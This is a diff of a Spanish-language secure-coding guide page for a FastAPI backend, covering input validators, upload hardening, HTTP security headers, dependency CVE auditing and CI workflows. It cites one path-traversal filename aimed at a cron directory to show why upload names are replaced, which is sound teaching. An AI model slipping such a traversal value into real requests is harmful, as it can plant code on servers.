-        <span class="kw">if</span> v.lower() <span class="kw">in</span> reserved:
-            <span class="kw">raise</span> <span class="cls">ValueError</span>(<span class="str">"Username reservado"</span>)
-        <span class="kw">return</span> v.lower()  <span class="cm"># normalizar a minúsculas</span>
 
     <span class="dec">@field_validator</span>(<span class="str">"password"</span>)
     <span class="dec">@classmethod</span>
     <span class="kw">def</span> <span class="fn">strong_password</span>(cls, v: <span class="cls">str</span>) -> <span class="cls">str</span>:
-        <span class="kw">if not</span> re.<span class="fn">search</span>(<span class="str">r"[A-Z]"</span>, v): <span class="kw">raise</span> <span class="cls">ValueError</span>(<span class="str">"Falta mayúscula"</span>)
-        <span class="kw">if not</span> re.<span class="fn">search</span>(<span class="str">r"\d"</span>, v):   <span class="kw">raise</span> <span class="cls">ValueError</span>(<span class="str">"Falta número"</span>)
-        <span class="kw">if not</span> re.<span class="fn">search</span>(<span class="str">r"[!@#$]"</span>, v): <span class="kw">raise</span> <span class="cls">ValueError</span>(<span class="str">"Falta símbolo"</span>)
+        <span class="kw">if not</span> re.<span class="fn">search</span>(<span class="str">r"[A-Z]"</span>, v): <span class="kw">raise</span> <span class="cls">ValueError</span>(<span class="str">"Falta may&#250;scula"</span>)
+        <span class="kw">if not</span> re.<span class="fn">search</span>(<span class="str">r"\d"</span>, v):   <span class="kw">raise</span> <span class="cls">ValueError</span>(<span class="str">"Falta n&#250;mero"</span>)
+        <span class="kw">if not</span> re.<span class="fn">search</span>(<span class="str">r"[!@#$%]"</span>, v): <span class="kw">raise</span> <span class="cls">ValueError</span>(<span class="str">"Falta s&#237;mbolo"</span>)
         <span class="kw">return</span> v
 
-    <span class="dec">@model_validator</span>(mode=<span class="str">"after"</span>)
-    <span class="kw">def</span> <span class="fn">email_username_not_match</span>(self):
-        <span class="cm"># El username no puede ser el email completo</span>
-        <span class="kw">if</span> self.username == self.email:
-            <span class="kw">raise</span> <span class="cls">ValueError</span>(<span class="str">"Username no puede ser el email"</span>)
-        <span class="kw">return</span> self
+    <span class="dec">@field_validator</span>(<span class="str">"username"</span>)
+    <span class="dec">@classmethod</span>
+    <span class="kw">def</span> <span class="fn">not_reserved</span>(cls, v: <span class="cls">str</span>) -> <span class="cls">str</span>:
+        reserved = {<span class="str">"admin"</span>, <span class="str">"root"</span>, <span class="str">"system"</span>, <span class="str">"api"</span>}
+        <span class="kw">if</span> v.lower() <span class="kw">in</span> reserved:
+            <span class="kw">raise</span> <span class="cls">ValueError</span>(<span class="str">"Username reservado"</span>)
+        <span class="kw">return</span> v.lower()</pre>
       </div>
     </div>
   </div>
 </section>
 
-<!-- ════ FILE UPLOAD SECURITY ════ -->
+<!-- FILE UPLOAD SECURITY -->
 <section class="section" id="uploads">
   <div class="section-inner">
-    <p class="sec-label fade-in">// sección 04 — subida de archivos</p>
-    <h2 class="sec-h2 fade-in">File Upload:<br><em>el vector más subestimado</em></h2>
-    <p class="sec-sub fade-in">Un endpoint de subida de archivos mal implementado puede comprometer todo el servidor. Cada paso del proceso tiene su propio vector de ataque.</p>
-
+    <p class="sec-label fade-in">// secci&#243;n 04 &#8212; subida de archivos</p>
+    <h2 class="sec-h2 fade-in">File Upload:<br><em>el vector m&#225;s subestimado</em></h2>
+    <p class="sec-sub fade-in">Un endpoint de subida mal implementado puede comprometer todo el servidor. Cada paso tiene su propio vector de ataque.</p>
     <div class="upload-diagram fade-in">
       <div class="upload-step">
-        <div class="us-phase">
-          <div class="us-phase-num">01</div>
-          <div class="us-phase-name">Extensión</div>
-        </div>
-        <div class="us-content">
-          Verificar la extensión del archivo. <strong>Pero</strong> la extensión es solo cosmética — un ejecutable puede llamarse <code>malware.jpg</code>. La extensión es necesaria pero no suficiente como única defensa.
-        </div>
-        <div class="us-status"><span class="us-badge ub-warn">Solo primer filtro</span></div>
+        <div class="us-phase"><div class="us-num">01</div><div class="us-name">Extensi&#243;n</div></div>
+        <div class="us-content">Verificar la extensi&#243;n del archivo. <strong>Pero</strong> la extensi&#243;n es solo cosmética &#8212; un ejecutable puede llamarse <code>malware.jpg</code>. Necesario pero no suficiente.</div>
+        <div class="us-status"><span class="us-badge ub-warn">Primer filtro</span></div>
       </div>
-
       <div class="upload-step">
-        <div class="us-phase">
-          <div class="us-phase-num">02</div>
-          <div class="us-phase-name">MIME type</div>
-        </div>
-        <div class="us-content">
-          El header <code>Content-Type</code> del request es enviado por el cliente — el atacante puede poner <code>image/jpeg</code> en un ejecutable. Verificar con <strong>python-magic</strong> lee los primeros bytes reales del archivo (magic bytes) y detecta el tipo real.
-        </div>
-        <div class="us-status"><span class="us-badge ub-warn">Verificar magic bytes</span></div>
+        <div class="us-phase"><div class="us-num">02</div><div class="us-name">MIME Type</div></div>
+        <div class="us-content">El header <code>Content-Type</code> lo env&#237;a el cliente &#8212; puede ser falso. <strong>python-magic</strong> lee los primeros bytes del archivo (magic bytes) y detecta el tipo real, no el declarado.</div>
+        <div class="us-status"><span class="us-badge ub-warn">Magic bytes</span></div>
       </div>
-
       <div class="upload-step">
-        <div class="us-phase">
-          <div class="us-phase-num">03</div>
-          <div class="us-phase-name">Tamaño</div>
-        </div>
-        <div class="us-content">
-          Sin límite de tamaño, el atacante puede subir archivos de varios GB para consumir tu disco y memoria — DoS por agotamiento de recursos. Limitar en <strong>FastAPI con UploadFile</strong> y en Nginx antes de llegar a la app.
-        </div>
-        <div class="us-status"><span class="us-badge ub-block">Límite estricto</span></div>
+        <div class="us-phase"><div class="us-num">03</div><div class="us-name">Tama&#241;o</div></div>
+        <div class="us-content">Sin l&#237;mite de tama&#241;o, el atacante sube archivos de varios GB para agotar disco y memoria &#8212; DoS. Limitar en FastAPI con <code>UploadFile.read(MAX_SIZE+1)</code> y en Nginx con <code>client_max_body_size</code>.</div>
+        <div class="us-status"><span class="us-badge ub-block">L&#237;mite estricto</span></div>
       </div>
-
       <div class="upload-step">
-        <div class="us-phase">
-          <div class="us-phase-num">04</div>
-          <div class="us-phase-name">Nombre</div>
-        </div>
-        <div class="us-content">
-          El nombre original nunca debe usarse para guardar el archivo. <code>../../etc/cron.daily/backdoor.sh</code> es un nombre de archivo válido. <strong>Siempre renombrar</strong> con un UUID generado internamente antes de guardar.
-        </div>
+        <div class="us-phase"><div class="us-num">04</div><div class="us-name">Nombre</div></div>
+        <div class="us-content">El nombre original nunca debe usarse para guardar. <code>../../etc/cron.daily/backdoor.sh</code> es un nombre de archivo v&#225;lido. <strong>Siempre renombrar</strong> con UUID generado internamente.</div>
         <div class="us-status"><span class="us-badge ub-block">UUID siempre</span></div>
       </div>
-
       <div class="upload-step">
-        <div class="us-phase">
-          <div class="us-phase-num">05</div>
-          <div class="us-phase-name">Contenido</div>
-        </div>
-        <div class="us-content">
-          Para imágenes: reprocesar con <strong>Pillow</strong> — abrir y re-guardar elimina cualquier payload embebido en los metadatos EXIF o en el archivo en sí. Una imagen que pasa por Pillow.save() es limpia.
-        </div>
+        <div class="us-phase"><div class="us-num">05</div><div class="us-name">Contenido</div></div>
+        <div class="us-content">Para im&#225;genes: reprocesar con <strong>Pillow</strong>. Abrir y re-guardar elimina payloads en metadatos EXIF y cualquier contenido malicioso embebido. Una imagen que pasa por Pillow.save() es limpia.</div>
         <div class="us-status"><span class="us-badge ub-pass">Re-procesar</span></div>
       </div>
-
       <div class="upload-step">
-        <div class="us-phase">
-          <div class="us-phase-num">06</div>
-          <div class="us-phase-name">Almacenamiento</div>
-        </div>
-        <div class="us-content">
-          Nunca guardar uploads en el mismo directorio que el código. Usar <strong>S3 / R2 / MinIO</strong> — separación completa. Los archivos no son ejecutables en S3. Generar URLs firmadas con expiración para acceso.
-        </div>
-        <div class="us-status"><span class="us-badge ub-pass">S3 / Object store</span></div>
+        <div class="us-phase"><div class="us-num">06</div><div class="us-name">Almacenamiento</div></div>
+        <div class="us-content">Nunca guardar uploads en el mismo directorio que el c&#243;digo. Usar <strong>S3 / R2 / MinIO</strong> &#8212; separaci&#243;n completa. Los archivos no son ejecutables en S3. URLs firmadas con expiraci&#243;n para acceso.</div>
+        <div class="us-status"><span class="us-badge ub-pass">Object Store</span></div>
       </div>
     </div>
 
-    <!-- Código de upload seguro -->
-    <div style="margin-top:3rem" class="fade-in">
-      <div class="code-block-sm cb-good" style="border-top:1px solid rgba(6,214,160,0.12)">
-        <span class="cb-label lbl-good">✓ Endpoint de upload seguro completo</span>
-<span class="cm"># pip install python-magic Pillow</span>
-<span class="kw">import</span> magic, uuid
+    <div style="margin-top:2.5rem" class="fade-in">
+      <div class="cblock cb-good" style="border-top:1px solid rgba(6,214,160,0.12)">
+        <span class="cb-label lbl-good">&#10003; Endpoint de upload seguro completo</span>
+        <pre><span class="cm"># pip install python-magic Pillow</span>
+<span class="kw">import</span> magic, uuid, io
 <span class="kw">from</span> fastapi <span class="kw">import</span> UploadFile, File, HTTPException
 <span class="kw">from</span> PIL <span class="kw">import</span> Image
 <span class="kw">from</span> pathlib <span class="kw">import</span> Path
-<span class="kw">import</span> io
 
 UPLOAD_DIR = Path(<span class="str">"/app/uploads"</span>)
-MAX_SIZE = <span class="num">5</span> * <span class="num">1024</span> * <span class="num">1024</span>  <span class="cm"># 5MB</span>
-ALLOWED_TYPES = {<span class="str">"image/jpeg"</span>, <span class="str">"image/png"</span>, <span class="str">"image/webp"</span>}
+MAX_SIZE   = <span class="num">5</span> * <span class="num">1024</span> * <span class="num">1024</span>  <span class="cm"># 5 MB</span>
+ALLOWED    = {<span class="str">"image/jpeg"</span>, <span class="str">"image/png"</span>, <span class="str">"image/webp"</span>}
 
 <span class="dec">@router.post</span>(<span class="str">"/upload/avatar"</span>)
 <span class="dec">@limiter.limit</span>(<span class="str">"10/hour"</span>)
 <span class="kw">async def</span> <span class="fn">upload_avatar</span>(
     file: UploadFile = <span class="fn">File</span>(...),
-    current_user=<span class="fn">Depends</span>(get_current_user),
+    user=<span class="fn">Depends</span>(get_current_user),
 ):
-    <span class="cm"># 1. Leer con límite de tamaño</span>
-    content = <span class="kw">await</span> file.<span class="fn">read</span>(<span class="num">MAX_SIZE</span> + <span class="num">1</span>)
+    <span class="cm"># 1. Leer con l&#237;mite de tama&#241;o</span>
+    content = <span class="kw">await</span> file.<span class="fn">read</span>(MAX_SIZE + <span class="num">1</span>)
     <span class="kw">if</span> <span class="fn">len</span>(content) > MAX_SIZE:
-        <span class="kw">raise</span> <span class="fn">HTTPException</span>(<span class="num">413</span>, <span class="str">"Archivo demasiado grande (máx 5MB)"</span>)
+        <span class="kw">raise</span> <span class="fn">HTTPException</span>(<span class="num">413</span>, <span class="str">"M&#225;ximo 5MB"</span>)
 
-    <span class="cm"># 2. Verificar magic bytes reales (ignora Content-Type del cliente)</span>
+    <span class="cm"># 2. Verificar magic bytes (ignora Content-Type del cliente)</span>
     real_type = magic.<span class="fn">from_buffer</span>(content, mime=<span class="kw">True</span>)
-    <span class="kw">if</span> real_type <span class="kw">not in</span> ALLOWED_TYPES:
+    <span class="kw">if</span> real_type <span class="kw">not in</span> ALLOWED:
         <span class="kw">raise</span> <span class="fn">HTTPException</span>(<span class="num">422</span>, <span class="fn">f</span><span class="str">"Tipo no permitido: {real_type}"</span>)
 
-    <span class="cm"># 3. Re-procesar imagen (elimina payloads embebidos)</span>
+    <span class="cm"># 3. Re-procesar con Pillow (elimina payloads embebidos)</span>
     <span class="kw">try</span>:
         img = <span class="fn">Image.open</span>(io.<span class="fn">BytesIO</span>(content))
-        img.<span class="fn">verify</span>()  <span class="cm"># detecta imágenes corruptas/maliciosas</span>
+        img.<span class="fn">verify</span>()
         img = <span class="fn">Image.open</span>(io.<span class="fn">BytesIO</span>(content))
-        img = img.<span class="fn">convert</span>(<span class="str">"RGB"</span>)  <span class="cm"># normaliza formato</span>
-        img.<span class="fn">thumbnail</span>((<span class="num">800</span>, <span class="num">800</span>))  <span class="cm"># limita dimensiones</span>
+        img = img.<span class="fn">convert</span>(<span class="str">"RGB"</span>)
+        img.<span class="fn">thumbnail</span>((<span class="num">800</span>, <span class="num">800</span>))
     <span class="kw">except</span> Exception:
-        <span class="kw">raise</span> <span class="fn">HTTPException</span>(<span class="num">422</span>, <span class="str">"Imagen inválida o corrupta"</span>)
+        <span class="kw">raise</span> <span class="fn">HTTPException</span>(<span class="num">422</span>, <span class="str">"Imagen inv&#225;lida"</span>)
 
     <span class="cm"># 4. Guardar con UUID (NUNCA el nombre original)</span>
     safe_name = <span class="fn">f</span><span class="str">"{uuid.uuid4()}.jpg"</span>
     output = io.<span class="fn">BytesIO</span>()
-    img.<span class="fn">save</span>(output, format=<span class="str">"JPEG"</span>, quality=<span class="num">85</span>, optimize=<span class="kw">True</span>)
-    <span class="cm"># → enviar a S3 o guardar en UPLOAD_DIR</span>
-    <span class="kw">return</span> {<span class="str">"filename"</span>: safe_name, <span class="str">"size"</span>: output.<span class="fn">tell</span>()}
+    img.<span class="fn">save</span>(output, format=<span class="str">"JPEG"</span>, quality=<span class="num">85</span>)
+    <span class="cm"># &#8594; enviar a S3 / MinIO</span>
+    <span class="kw">return</span> {<span class="str">"filename"</span>: safe_name, <span class="str">"size"</span>: output.<span class="fn">tell</span>()}</pre>
       </div>
     </div>
   </div>
 </section>
 
-<!-- ════ SECURITY HEADERS AUDIT ════ -->
+<!-- SECURITY HEADERS -->
 <section class="section" id="headers" style="background:linear-gradient(to bottom,transparent,rgba(255,107,26,0.01),transparent)">
   <div class="section-inner">
-    <p class="sec-label fade-in">// sección 05 — headers HTTP</p>
+    <p class="sec-label fade-in">// secci&#243;n 05 &#8212; headers HTTP</p>
     <h2 class="sec-h2 fade-in">Security Headers:<br><em>la capa invisible</em></h2>
-    <p class="sec-sub fade-in">Cada header es una instrucción al navegador sobre cómo comportarse con tu respuesta. Juntos forman una capa de defensa sin código adicional en el frontend.</p>
-
+    <p class="sec-sub fade-in">Cada header es una instrucci&#243;n al navegador. Juntos forman una capa de defensa sin c&#243;digo adicional en el frontend.</p>
     <div class="headers-grid fade-in">
       <div class="header-row">
         <div class="hrow-name">Content-Security-Policy</div>
-        <div class="hrow-val">default-src 'self'; script-src 'self' 'nonce-{nonce}'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'</div>
-        <div class="hrow-why">El más importante. Controla exactamente qué recursos puede cargar el navegador. Previene XSS al bloquear scripts no autorizados.</div>
+        <div class="hrow-val">default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data: https:; frame-ancestors 'none'</div>
+        <div class="hrow-why">El m&#225;s importante. Controla exactamente qu&#233; recursos puede cargar el navegador. Previene XSS bloqueando scripts no autorizados.</div>
         <span class="hrow-status hs-must">OBLIGATORIO</span>
       </div>
       <div class="header-row">
         <div class="hrow-name">Strict-Transport-Security</div>
         <div class="hrow-val">max-age=31536000; includeSubDomains; preload</div>
-        <div class="hrow-why">Fuerza HTTPS por 1 año incluso si el usuario escribe http://. Previene SSL stripping. <code style="font-size:0.75em">preload</code> lo incluye en la lista precargada de los navegadores.</div>
+        <div class="hrow-why">Fuerza HTTPS por 1 a&#241;o aunque el usuario escriba http://. Previene SSL stripping. preload lo incluye en la lista de navegadores.</div>
         <span class="hrow-status hs-must">OBLIGATORIO</span>
       </div>
       <div class="header-row">
         <div class="hrow-name">X-Content-Type-Options</div>
         <div class="hrow-val">nosniff</div>
-        <div class="hrow-why">Previene MIME type sniffing — el navegador no puede "adivinar" que un archivo de texto es en realidad JavaScript ejecutable.</div>
+        <div class="hrow-why">Previene MIME type sniffing. El navegador no puede interpretar un archivo de texto como JavaScript ejecutable.</div>
         <span class="hrow-status hs-must">OBLIGATORIO</span>
       </div>
       <div class="header-row">
         <div class="hrow-name">X-Frame-Options</div>
         <div class="hrow-val">DENY</div>
-        <div class="hrow-why">Previene clickjacking — tu página no puede ser embebida en un iframe de otro dominio para engañar a usuarios que crean estar en tu sitio.</div>
+        <div class="hrow-why">Previene clickjacking. Tu p&#225;gina no puede ser embebida en un iframe de otro dominio para enga&#241;ar usuarios.</div>
         <span class="hrow-status hs-must">OBLIGATORIO</span>
       </div>
       <div class="header-row">
         <div class="hrow-name">Permissions-Policy</div>
         <div class="hrow-val">camera=(), microphone=(), geolocation=(), interest-cohort=()</div>
-        <div class="hrow-why">Deshabilita APIs del navegador que tu app no necesita. Un XSS no puede acceder a la cámara si el header lo prohíbe.</div>
+        <div class="hrow-why">Deshabilita APIs del navegador que tu app no necesita. Un XSS no puede acceder a la c&#225;mara si el header lo proh&#237;be.</div>
         <span class="hrow-status hs-should">IMPORTANTE</span>
       </div>
       <div class="header-row">
         <div class="hrow-name">Referrer-Policy</div>
         <div class="hrow-val">strict-origin-when-cross-origin</div>
-        <div class="hrow-why">Controla qué URL se envía en el header Referer. Evita que URLs con tokens o datos sensibles se filtren a sitios externos.</div>
+        <div class="hrow-why">Controla qu&#233; URL se env&#237;a en el header Referer. Evita que URLs con tokens se filtren a sitios externos.</div>
         <span class="hrow-status hs-should">IMPORTANTE</span>
       </div>
       <div class="header-row">
         <div class="hrow-name">Server</div>
-        <div class="hrow-val">(vacío)</div>
-        <div class="hrow-why">El header Server por defecto revela "uvicorn". Elimínalo — el atacante no debería saber qué tecnología usas ni la versión.</div>
+        <div class="hrow-val">(vac&#237;o &#8212; eliminar)</div>
+        <div class="hrow-why">Por defecto revela "uvicorn/0.29.0". Elim&#237;nalo &#8212; el atacante no debe saber qu&#233; tecnolog&#237;a usas ni la versi&#243;n exacta.</div>
         <span class="hrow-status hs-should">IMPORTANTE</span>
       </div>
       <div class="header-row">
         <div class="hrow-name">Cross-Origin-Opener-Policy</div>
         <div class="hrow-val">same-origin</div>
-        <div class="hrow-why">Aisla tu página en su propio contexto de navegación. Mitiga ataques Spectre y acceso cross-origin a tu window object.</div>
+        <div class="hrow-why">A&#237;sla tu p&#225;gina en su propio contexto de navegaci&#243;n. Mitiga ataques Spectre y acceso cross-origin al window object.</div>
         <span class="hrow-status hs-nice">RECOMENDADO</span>
-      </div>
-    </div>
-
-    <!-- Middleware completo -->
-    <div style="margin-top:3rem" class="fade-in">
-      <div class="code-block-sm cb-good" style="border-top:1px solid rgba(6,214,160,0.12)">
-        <span class="cb-label lbl-good">✓ Middleware completo — todos los headers en producción</span>
-<span class="cm"># app/middleware/security.py — versión completa</span>
-<span class="kw">from</span> starlette.middleware.base <span class="kw">import</span> BaseHTTPMiddleware
-<span class="kw">from</span> starlette.requests <span class="kw">import</span> Request
-<span class="kw">import</span> secrets
-
-<span class="kw">class</span> <span class="cls">SecurityHeadersMiddleware</span>(BaseHTTPMiddleware):
-    <span class="kw">async def</span> <span class="fn">dispatch</span>(<span class="kw">self</span>, request: Request, call_next):
-        response = <span class="kw">await</span> <span class="fn">call_next</span>(request)
-        nonce = secrets.<span class="fn">token_urlsafe</span>(<span class="num">16</span>)
-
-        h = response.headers
-        h[<span class="str">"Content-Security-Policy"</span>] = (
-            <span class="fn">f</span><span class="str">"default-src 'self'; script-src 'self' 'nonce-{nonce}'; "</span>
-            <span class="str">"style-src 'self'; img-src 'self' data: https:; "</span>
-            <span class="str">"font-src 'self'; connect-src 'self'; frame-ancestors 'none'"</span>
-        )
-        h[<span class="str">"Strict-Transport-Security"</span>] = <span class="str">"max-age=31536000; includeSubDomains; preload"</span>
-        h[<span class="str">"X-Content-Type-Options"</span>]    = <span class="str">"nosniff"</span>
-        h[<span class="str">"X-Frame-Options"</span>]           = <span class="str">"DENY"</span>
-        h[<span class="str">"Referrer-Policy"</span>]           = <span class="str">"strict-origin-when-cross-origin"</span>
-        h[<span class="str">"Permissions-Policy"</span>]        = <span class="str">"camera=(), microphone=(), geolocation=()"</span>
-        h[<span class="str">"Cross-Origin-Opener-Policy"</span>] = <span class="str">"same-origin"</span>
-        h[<span class="str">"Cross-Origin-Resource-Policy"</span>] = <span class="str">"same-origin"</span>
-        h[<span class="str">"Server"</span>]                    = <span class="str">""</span>         <span class="cm"># ocultar stack</span>
-        h[<span class="str">"X-Powered-By"</span>]              = <span class="str">""</span>         <span class="cm"># ocultar stack</span>
-        <span class="kw">return</span> response
-
-<span class="cm"># Verificar en: https://securityheaders.com</span>
-<span class="cm"># Objetivo: puntuación A o A+</span>
       </div>
     </div>
   </div>
 </section>
 
-<!-- ════ DEPENDENCY AUDIT ════ -->
+<!-- DEPENDENCY AUDIT -->
 <section class="section" id="dependencias">
   <div class="section-inner">
-    <p class="sec-label fade-in">// sección 06 — dependencias</p>
+    <p class="sec-label fade-in">// secci&#243;n 06 &#8212; dependencias</p>
     <h2 class="sec-h2 fade-in">Tus dependencias<br><em>son tu superficie</em></h2>
-    <p class="sec-sub fade-in">Una librería con CVE es tan peligrosa como código vulnerable propio. Auditar dependencias es parte del ciclo de desarrollo, no una actividad opcional.</p>
-
+    <p class="sec-sub fade-in">Una librer&#237;a con CVE es tan peligrosa como c&#243;digo vulnerable propio. Auditar dependencias es parte del ciclo de desarrollo.</p>
     <div class="deps-table fade-in">
-      <div class="dep-row header-row-dep">
-        <div class="dep-hdr">Librería</div>
-        <div class="dep-hdr">Actual</div>
-        <div class="dep-hdr">Latest</div>
-        <div class="dep-hdr">Notas</div>
-        <div class="dep-hdr">Estado</div>
+      <div class="dep-row dep-hdr-row">
+        <span class="dep-hdr-label">Librer&#237;a</span>
+        <span class="dep-hdr-label">Actual</span>
+        <span class="dep-hdr-label">Latest</span>
+        <span class="dep-hdr-label">Notas</span>
+        <span class="dep-hdr-label">Estado</span>
       </div>
       <div class="dep-row">
         <div class="dep-name">fastapi</div>
-        <div class="dep-ver" style="color:var(--green)">0.110.1</div>
+        <div class="dep-ver dep-ver-ok">0.110.1</div>
         <div class="dep-latest">0.110.1</div>
-        <div class="dep-desc">Framework principal. Mantener actualizado.</div>
+        <div class="dep-desc">Framework principal. Sin CVEs activos.</div>
         <span class="dep-badge db-ok">OK</span>
       </div>
       <div class="dep-row">
         <div class="dep-name">python-jose</div>
-        <div class="dep-ver" style="color:var(--red)">3.3.0</div>
+        <div class="dep-ver dep-ver-bad">3.3.0</div>
         <div class="dep-latest">3.3.0</div>
-        <div class="dep-desc">CVE-2024-33663: algorithm confusion en versiones antiguas</div>
+        <div class="dep-desc">CVE-2024-33663: algorithm confusion. Considerar authlib.</div>
         <span class="dep-badge db-vuln">CVE!</span>
       </div>
       <div class="dep-row">
         <div class="dep-name">cryptography</div>
-        <div class="dep-ver" style="color:var(--yellow)">41.0.0</div>
+        <div class="dep-ver dep-ver-warn">41.0.0</div>
         <div class="dep-latest">42.0.8</div>
-        <div class="dep-desc">Actualizar — parches de seguridad en 42.x</div>
+        <div class="dep-desc">Actualizar &#8212; parches de seguridad en v42.x</div>
         <span class="dep-badge db-upd">ACTUALIZAR</span>
       </div>
       <div class="dep-row">
         <div class="dep-name">sqlalchemy</div>
-        <div class="dep-ver" style="color:var(--green)">2.0.30</div>
+        <div class="dep-ver dep-ver-ok">2.0.30</div>
         <div class="dep-latest">2.0.30</div>
-        <div class="dep-desc">Versión 2.x. ORM async maduro y seguro.</div>
-        <span class="dep-badge db-ok">OK</span>
-      </div>
-      <div class="dep-row">
-        <div class="dep-name">pydantic</div>
-        <div class="dep-ver" style="color:var(--green)">2.7.1</div>
-        <div class="dep-latest">2.7.1</div>
-        <div class="dep-desc">v2 con validación en Rust. Rápido y seguro.</div>
+        <div class="dep-desc">ORM async maduro. Sin CVEs activos en v2.x</div>
         <span class="dep-badge db-ok">OK</span>
       </div>
       <div class="dep-row">
         <div class="dep-name">pillow</div>
-        <div class="dep-ver" style="color:var(--yellow)">9.5.0</div>
+        <div class="dep-ver dep-ver-bad">9.5.0</div>
         <div class="dep-latest">10.3.0</div>
-        <div class="dep-desc">Múltiples CVEs en 9.x relacionados con procesamiento de imágenes</div>
+        <div class="dep-desc">M&#250;ltiples CVEs en 9.x con procesamiento de im&#225;genes. Urgente.</div>
         <span class="dep-badge db-vuln">URGENTE</span>
       </div>
       <div class="dep-row">
+        <div class="dep-name">pydantic</div>
+        <div class="dep-ver dep-ver-ok">2.7.1</div>
+        <div class="dep-latest">2.7.1</div>
+        <div class="dep-desc">v2 con validaci&#243;n en Rust. R&#225;pido y seguro.</div>
+        <span class="dep-badge db-ok">OK</span>
+      </div>
+      <div class="dep-row">
         <div class="dep-name">uvicorn</div>
-        <div class="dep-ver" style="color:var(--green)">0.29.0</div>
+        <div class="dep-ver dep-ver-ok">0.29.0</div>
         <div class="dep-latest">0.29.0</div>
         <div class="dep-desc">Servidor ASGI. Sin CVEs activos.</div>
         <span class="dep-badge db-ok">OK</span>
       </div>
     </div>
 
-    <!-- Comandos de auditoría -->
-    <div style="margin-top:3rem;display:grid;grid-template-columns:1fr 1fr;gap:2rem" class="fade-in">
-      <div class="code-block-sm cb-good" style="border-top:1px solid rgba(6,214,160,0.12)">
-        <span class="cb-label lbl-good">✓ Auditar con pip-audit (recomendado)</span>
-<span class="cm"># pip install pip-audit</span>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:2rem;margin-top:2.5rem" class="fade-in">
+      <div class="cblock cb-good" style="border-top:1px solid rgba(6,214,160,0.12)">
+        <span class="cb-label lbl-good">&#10003; Auditar con pip-audit</span>
+        <pre><span class="cm"># pip install pip-audit</span>
 $ pip-audit
 
-<span class="cm">Name           Version  ID               Fix</span>
-<span class="vl">pillow         9.5.0    GHSA-56pw-mpj4  10.0.1</span>
-<span class="vl">python-jose    3.3.0    CVE-2024-33663  No fix</span>
+Name         Version  ID               Fix
+<span class="vl">pillow       9.5.0    GHSA-56pw-mpj4  10.0.1
+python-jose  3.3.0    CVE-2024-33663  --</span>
 
-<span class="cm"># Exportar como JSON para CI/CD</span>
-$ pip-audit --format json -o audit.json
-
-<span class="cm"># Fix automático</span>
+<span class="cm"># Fix autom&#225;tico donde sea posible</span>
 $ pip-audit --fix
+
+<span class="cm"># JSON para CI/CD pipeline</span>
+$ pip-audit --format json -o audit.json</pre>
       </div>
-      <div class="code-block-sm cb-good" style="border-top:1px solid rgba(6,214,160,0.12)">
-        <span class="cb-label lbl-good">✓ GitHub Actions — audit en cada PR</span>
-<span class="cm"># .github/workflows/security.yml</span>
-<span class="fn">name</span>: Security Audit
+      <div class="cblock cb-good" style="border-top:1px solid rgba(6,214,160,0.12)">
+        <span class="cb-label lbl-good">&#10003; GitHub Actions &#8212; audit en cada PR</span>
+        <pre><span class="cm"># .github/workflows/security.yml</span>
+name: Security Audit
+on: [push, pull_request]
 
-<span class="fn">on</span>: [push, pull_request]
-
-<span class="fn">jobs</span>:
-  <span class="fn">audit</span>:
-    <span class="fn">runs-on</span>: ubuntu-latest
-    <span class="fn">steps</span>:
-      - <span class="fn">uses</span>: actions/checkout@v4
-      - <span class="fn">run</span>: pip install pip-audit
-      - <span class="fn">run</span>: pip-audit --requirement requirements.txt
-      - <span class="fn">run</span>: pip-audit --fail-on-error  <span class="cm"># falla el PR si hay CVEs</span>
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: pip install pip-audit
+      - run: pip-audit -r requirements.txt
+      - run: pip-audit --fail-on-error
+        <span class="cm"># falla el PR si hay CVEs</span></pre>
       </div>
     </div>
   </div>
 </section>
 
-<!-- ════ SECURE CODING PATTERNS ════ -->
-<section class="patterns-section" id="patrones">
+<!-- SECURE CODING PATTERNS -->
+<section class="section" style="background:linear-gradient(to bottom,transparent,rgba(255,107,26,0.01),transparent)">
   <div class="section-inner">
-    <p class="sec-label fade-in">// sección 07 — patrones</p>
-    <h2 class="sec-h2 fade-in">Patrones de<br><em>código seguro</em></h2>
-    <p class="sec-sub fade-in">Decisiones de diseño que previenen clases enteras de vulnerabilidades antes de que existan.</p>
-
+    <p class="sec-label fade-in">// secci&#243;n 07 &#8212; patrones</p>
+    <h2 class="sec-h2 fade-in">Patrones de<br><em>c&#243;digo seguro</em></h2>
+    <p class="sec-sub fade-in">Decisiones de dise&#241;o que previenen clases enteras de vulnerabilidades antes de que existan.</p>
     <div class="pattern-cards">
       <div class="pattern-card fade-in">
         <div class="pattern-num">01</div>
-        <div class="pattern-icon">🔐</div>
+        <div class="pattern-icon">&#128274;</div>
         <div class="pattern-name">Deny by Default</div>
-        <div class="pattern-desc">Todo está bloqueado por defecto. Los endpoints requieren autenticación salvo que explícitamente se marquen como públicos. El router incluye auth en todos.</div>
-        <div class="pattern-code">router = APIRouter(<br>&nbsp;&nbsp;dependencies=[Depends(get_current_user)]<br>)<br># Los endpoints heredan auth automáticamente</div>
+        <div class="pattern-desc">Todo est&#225; bloqueado por defecto. Los endpoints requieren autenticaci&#243;n salvo que expl&#237;citamente se marquen como p&#250;blicos.</div>
+        <div class="pattern-code">router = APIRouter(<br>&nbsp;&nbsp;dependencies=[Depends(get_current_user)]<br>)<br><span style="color:var(--gray)"># herencia autom&#225;tica de auth</span></div>
       </div>
       <div class="pattern-card fade-in">
         <div class="pattern-num">02</div>
-        <div class="pattern-icon">📋</div>
+        <div class="pattern-icon">&#128203;</div>
         <div class="pattern-name">Allowlist, no Denylist</div>
-        <div class="pattern-desc">Define lo que se permite, no lo que se bloquea. Los denylist siempre tienen gaps. Si defines "solo JPEG, PNG, WebP", cualquier otro tipo falla automáticamente.</div>
-        <div class="pattern-code">ALLOWED = {"image/jpeg", "image/png"}<br>if mime_type not in ALLOWED:<br>&nbsp;&nbsp;raise HTTPException(422)</div>
+        <div class="pattern-desc">Define lo que se permite, no lo que se bloquea. Los denylist siempre tienen gaps. Define tipos permitidos expl&#237;citamente.</div>
+        <div class="pattern-code">ALLOWED = {"image/jpeg","image/png"}<br>if mime_type not in ALLOWED:<br>&nbsp;&nbsp;raise HTTPException(422)</div>
       </div>
       <div class="pattern-card fade-in">
         <div class="pattern-num">03</div>
-        <div class="pattern-icon">🏷</div>
